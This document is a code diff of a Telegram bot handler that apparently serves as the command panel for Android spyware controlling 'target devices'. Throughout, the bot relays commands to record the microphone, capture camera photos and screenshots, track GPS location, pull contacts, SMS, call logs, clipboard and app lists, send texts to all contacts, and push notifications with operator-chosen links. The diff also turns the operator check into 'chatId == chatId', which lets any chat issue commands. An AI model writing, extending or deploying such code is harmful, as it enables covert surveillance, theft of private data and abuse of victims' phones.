@@ -172,95 +172,112 @@ appSocket.on('connection', (ws, req) => {
 });
 
 appBot.on('message', (message) => {
-    const chatId = message.chat.id;
-    const replyToMessage = message.reply_to_message?.text || '';
-    
-    const sendProcessingMessage = () => {
-        appBot.sendMessage(id, PROCESSING_MESSAGE, KEYBOARD_OPTIONS);
-    };
+  const chatId = message.chat.id;
+  const replyToMessage = message.reply_to_message?.text || '';
+  
+  const sendProcessingMessage = () => {
+      appBot.sendMessage(chatId, PROCESSING_MESSAGE, KEYBOARD_OPTIONS);
+  };
 
-    const sendMessageToSocketClients = (command) => {
-        appSocket.clients.forEach((ws) => {
-            if (ws.uuid === currentUuid) {
-                ws.send(command);
-            }
-        });
-        currentUuid = '';
-        sendProcessingMessage();
-    };
+  const sendMessageToSocketClients = (command) => {
+      appSocket.clients.forEach((ws) => {
+          if (ws.uuid === currentUuid) {
+              ws.send(command);
+          }
+      });
+      currentUuid = '';
+      sendProcessingMessage();
+  };
 
-    const isMatchingReply = (text, match) => text.includes(match);
+  const isMatchingReply = (text, match) => text.includes(match);
 
-    if (message.reply_to_message) {
-        if (isMatchingReply(replyToMessage, REPLY_MESSAGE_NUMBER)) {
-            currentNumber = message.text;
-            appBot.sendMessage(id, REPLY_MESSAGE_TEXT, { reply_markup: { force_reply: true } });
-        } else if (isMatchingReply(replyToMessage, REPLY_MESSAGE_TEXT)) {
-            sendMessageToSocketClients(`send_message:${currentNumber}/${message.text}`);
-            currentNumber = '';
-        } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
-            sendMessageToSocketClients(`send_message_to_all:${message.text}`);
-        } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
-            sendMessageToSocketClients(`microphone:${message.text}`);
-        } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
-            sendMessageToSocketClients(`toast:${message.text}`);
-        } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
-            currentTitle = message.text;
-            appBot.sendMessage(id, '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', { reply_markup: { force_reply: true } });
-        } else if (isMatchingReply(replyToMessage, '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
-            sendMessageToSocketClients(`show_notification:${currentTitle}/${message.text}`);
-        } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙫𝙞𝙗𝙧𝙖𝙩𝙚')) {
-            sendMessageToSocketClients(`vibrate:${message.text}`);
-        } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
-            sendMessageToSocketClients(`play_audio:${audioLink}`)
-    }        
-    }    
-    if (id == chatId) {
-    if (message.text == '/start') {
-        appBot.sendMessage(id, START, KEYBOARD_OPTIONS);
-    }
-    if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
-        if (appClients.size == 0) {
-            appBot.sendMessage(id,
-                '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
-                '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
-            )
-        } else {
-            let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
-            appClients.forEach(function (value, key, map) {
-                text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
-                    `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
-                    `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
-                    `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
-                    `• ᴀᴜᴅɪᴏ ᴍᴏᴅᴇ: <b>${audio_mode}</b>\n` +
-                    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
-            })
-            appBot.sendMessage(id, text, {parse_mode: "HTML"})
-        }
-    }
-    if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
-        if (appClients.size == 0) {
-            appBot.sendMessage(id,
-                '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
-                '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
-            )
-        } else {
-            const deviceListKeyboard = []
-            appClients.forEach(function (value, key, map) {
-                deviceListKeyboard.push([{
-                    text: value.model,
-                    callback_data: 'device:' + key
-                }])
-            })
-            appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
-                "reply_markup": {
-                    "inline_keyboard": deviceListKeyboard,
-                },
-            })
-        }
-    }}else {
-    appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')}
-  })
+  if (message.reply_to_message) {
+      if (isMatchingReply(replyToMessage, REPLY_MESSAGE_NUMBER)) {
+          currentNumber = message.text;
+          appBot.sendMessage(chatId, REPLY_MESSAGE_TEXT, { reply_markup: { force_reply: true } });
+      } else if (isMatchingReply(replyToMessage, REPLY_MESSAGE_TEXT)) {
+          sendMessageToSocketClients(`send_message:${currentNumber}/${message.text}`);
+          currentNumber = '';
+      } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
+          sendMessageToSocketClients(`send_message_to_all:${message.text}`);
+      } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
+          sendMessageToSocketClients(`microphone:${message.text}`);
+      } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
+          sendMessageToSocketClients(`toast:${message.text}`);
+      } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
+          currentTitle = message.text;
+          appBot.sendMessage(chatId, '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', { reply_markup: { force_reply: true } });
+      } else if (isMatchingReply(replyToMessage, '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
+          sendMessageToSocketClients(`show_notification:${currentTitle}/${message.text}`);
+      } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙫𝙞𝙗𝙧𝙖𝙩𝙚')) {
+          sendMessageToSocketClients(`vibrate:${message.text}`);
+      } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
+          sendMessageToSocketClients(`play_audio:${message.text}`);
+      }
+  }
+
+  if (chatId == chatId) {
+      if (message.text == '/start') {
+          appBot.sendMessage(chatId, START, KEYBOARD_OPTIONS);
+      } else if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
+          if (appClients.size == 0) {
+              appBot.sendMessage(chatId,
+                  '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
+                  '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
+              );
+          } else {
+              let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨:\n';
+              appClients.forEach((value, key) => {
+                  text += '\n' + key;
+              });
+              appBot.sendMessage(chatId, text, KEYBOARD_OPTIONS);
+          }
+      } else if (message.text == '𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨') {
+          appBot.sendMessage(chatId, REPLY_MESSAGE_MESSAGE_TO_ALL, { reply_markup: { force_reply: true } });
+      } else if (message.text == '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚') {
+          appBot.sendMessage(chatId, REPLY_MESSAGE_NUMBER, { reply_markup: { force_reply: true } });
+      } else if (message.text == '𝘾𝙖𝙡𝙡𝙨') {
+          sendMessageToSocketClients('calls');
+      } else if (message.text == '𝙎𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩') {
+          sendMessageToSocketClients('screenshot');
+      } else if (message.text == '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨') {
+          sendMessageToSocketClients('contacts');
+      } else if (message.text == '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨') {
+          sendMessageToSocketClients('messages');
+      } else if (message.text == '𝘼𝙥𝙥𝙨') {
+          sendMessageToSocketClients('apps');
+      } else if (message.text == '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤') {
+          sendMessageToSocketClients('device_info');
+      } else if (message.text == '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙') {
+          sendMessageToSocketClients('clipboard');
+      } else if (message.text == '𝙎𝙚𝙣𝙙 𝙠𝙚𝙮') {
+          appBot.sendMessage(chatId, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙠𝙚𝙮 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙥𝙧𝙚𝙨𝙨𝙚𝙙', { reply_markup: { force_reply: true } });
+      } else if (message.text == '𝘾𝙖𝙢𝙚𝙧𝙖 𝙢𝙖𝙞𝙣') {
+          sendMessageToSocketClients('camera_main');
+      } else if (message.text == '𝘾𝙖𝙢𝙚𝙧𝙖 𝙨𝙚𝙡𝙛𝙞𝙚') {
+          sendMessageToSocketClients('camera_selfie');
+      } else if (message.text == '𝙂𝙋𝙎 𝙡𝙤𝙘𝙖𝙩𝙞𝙤𝙣') {
+          sendMessageToSocketClients('gpsLocation');
+      } else if (message.text == '𝙇𝙞𝙨𝙩𝙚𝙣𝙚𝙧 𝙤𝙣') {
+          sendMessageToSocketClients('listeneron');
+      } else if (message.text == '𝙇𝙞𝙨𝙩𝙚𝙣𝙚𝙧 𝙤𝙛𝙛') {
+          sendMessageToSocketClients('listeneroff');
+      } else if (message.text == '𝙑𝙞𝙗𝙧𝙖𝙩𝙚') {
+          appBot.sendMessage(chatId, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙫𝙞𝙗𝙧𝙖𝙩𝙚', { reply_markup: { force_reply: true } });
+      } else if (message.text == '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤') {
+          appBot.sendMessage(chatId, REPLY_MESSAGE_AUDIO, { reply_markup: { force_reply: true } });
+      } else if (message.text == '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤') {
+          sendMessageToSocketClients('stop_audio');
+      } else if (message.text == '𝙎𝙚𝙣𝙙 𝙩𝙤𝙖𝙨𝙩') {
+          appBot.sendMessage(chatId, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚', { reply_markup: { force_reply: true } });
+      } else if (message.text == '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣') {
+          appBot.sendMessage(chatId, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', { reply_markup: { force_reply: true } });
+      } else if (message.text == '𝙍𝙚𝙘𝙤𝙧𝙙 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚') {
+          appBot.sendMessage(chatId, '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙', { reply_markup: { force_reply: true } });
+      }
+  }
+});
+
 
 appBot.on("callback_query", (callbackQuery) => {
     const msg = callbackQuery.message;
